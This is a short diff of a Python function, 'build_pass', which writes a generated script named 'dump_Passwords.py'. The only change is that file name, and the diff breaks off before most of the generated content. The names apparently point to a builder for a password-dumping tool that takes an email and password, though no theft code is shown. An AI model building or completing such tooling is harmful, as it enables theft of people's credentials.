@@ -1,5 +1,5 @@
 def build_pass(email, Password):
-	with open("dump_Password.py","w+") as file:
+	with open("dump_Passwords.py","w+") as file:
 		file.write("from Uptomage import upToMaGePAS\n")
 		file.write("from time import sleep\n")
 		file.write("""
